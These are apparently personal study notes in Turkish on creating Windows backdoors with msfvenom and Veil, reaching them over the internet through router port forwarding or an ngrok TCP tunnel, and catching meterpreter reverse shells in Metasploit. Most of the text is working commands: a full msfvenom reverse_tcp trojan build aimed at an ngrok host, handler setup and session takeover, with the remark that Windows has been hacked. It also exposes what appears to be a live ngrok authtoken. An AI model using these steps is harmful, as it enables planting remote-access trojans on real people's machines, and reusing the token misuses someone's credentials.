	OUTSIDE NETWORK
  PORT FORWARDING / Listening
 set LHOST <public ip>	-> Hedef bilgisayarda çalıştırıldığı anda bu bağlantı modeme gider,
 modeme gelen bu bilgi hangi porttan gelirse gelsin bana ilet Yani kali linux'a yönlendir diyebiliyoruz. 
 set LPORT 4040





  TUNNELING
 Tünel servisleri, kendi makinemizde çalıştırdığımız apache gibi sunucuları internete açmamıza olanak tanır.
 Port Forwarding'in Modem yerine herhangi bir Tünel Servisi kullanır. bkz: ngrok.com -> Download for Linux
 Programın çalışması için tokenimizi kaydediyoruz:
cd Downloads/ -> ./ngrok authtoken 23x2qIQq6YxnesbLV4H6lpYOI4F_61zjnzWqPjDqKvN1bg6go

cd Downloads/
./ngrok tcp 4242	-> Çok kullanılmayan bir port kullan mesela 80 portu web service portudur.
 Forwarding kısmındaki tcp://6.tcp.ngrok.io:16370 'dan gelen verileri localhost:4242 yönlendirir, yani bizim için sanal bir port açar.





  MSFVENOM ile Backdoor oluşturma
 Kodları ile oynamadan Veil'i tünel servislerinde kullanamazsınız.
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows lhost=0.tcp.ngrok.io lport=16370 -f exe -o /var/www/html/backdoors/msfVBackdoor.exe
	lhost= kısmına "ngrok'un verdiği public bir ip vermemiz gerekiyor."
	lport= kısmına "ngrok -> Forwarding -> tcp://6.tcp.ngrok.io:16370 -> girmemiz gereken değer: 16370 (backdoor oluştururken soldaki dış sunucu bilgilerini (public ip), Metasploit'a yazarken yani dinlerken ise sağdaki localhost(local ip) kısmını giriyoruz.
	-> Trojanımız oluşturuldu!

msfconsole
use exploit/multi/handler
use 4
set PAYLOAD windows/meterpreter/reverse_tcp
show options
set LHOST 0.0.0.0
set LPORT 4242
exploit -j -z

 newtab -> service apache2 start
 Sanal Windowsumuz tarayıcımızda 10.0.2.10/backdoors diye aratarak trojanımızı indirip çalıştırdığımızda,
 Terminaldeki session'ımız uyanacaktır.

enter
sessions -l	-> Id yazan kısımdaki sayıyı kullanıyoruz:
sessions -2	-> Bu session'ın içine girecektir. İşe yaramaz ise -> sessions -1
	Şuanda Windows'u Hackledik!	
-> dir yazarak içerisinde bulunduğumuz klasör hakkında bilgiler verilecektir.




	VEIL ile Backdoor oluşturma
	Veil'ı çalıştıramadık boşver zaten msfvenomla da yapabiliyoz boş yapma.
cd Downloads/
./ngrok tcp 4242


cd ..
cd opt/
cd Veil/
python3 Veil.py
use 1
list	-> Herhangi biri ile işlem yapabiliriz.
use 7
set lhost 0.tcp.ngrok.io
 [!] ERROR: You did not provide a valid IP!   -> Hata aldığımız için Veil'ın kodlarını değiştireceğiz.
set lport 16370		lport= kısmına "ngrok -> Forwarding -> tcp://6.tcp.ngrok.io:16370 -> girmemiz gereken değer: 16370 (backdoor oluştururken soldaki dış sunucu bilgilerini, dinlerken ise sağdaki localhost kısmını giriyoruz.
generate	-> Yazdıktan sonra isim girdiğimizde Trojanımızı bizim için oluşturacaktır.


use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set lhost 0.0.0.0
set lport 4242
exploit -j -z	-> Dinlemeye başladık.


 Cihaz http://10.0.2.10/backdoors/ içerisindeki Trojanımızı indirip çalıştırırsa session'ımız uyanacaktır.


sessions -l
sessions -1
sysinfo		-> Çalıştırdığımızda Windowsu Hacklediğimizi görmüş olacağız.